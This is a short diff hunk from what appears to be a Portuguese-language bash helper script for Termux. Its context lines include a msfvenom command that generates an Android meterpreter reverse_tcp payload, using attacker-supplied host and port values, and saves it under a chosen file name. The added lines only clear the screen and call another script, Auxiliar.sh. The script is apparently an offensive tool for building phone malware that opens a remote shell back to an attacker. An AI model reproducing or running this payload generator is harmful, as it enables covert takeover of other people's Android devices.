@@ -55,5 +55,10 @@ printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93mCriando $name\e[0m\n"
 
 msfvenom -p android/meterpreter/reverse_tcp lhost=$host lport=$port R> /data/data/com.termux/files/home/storage/downloads/$name
 
+clear
+
+cd ..
+
+bash Auxiliar.sh
 
 dependencias
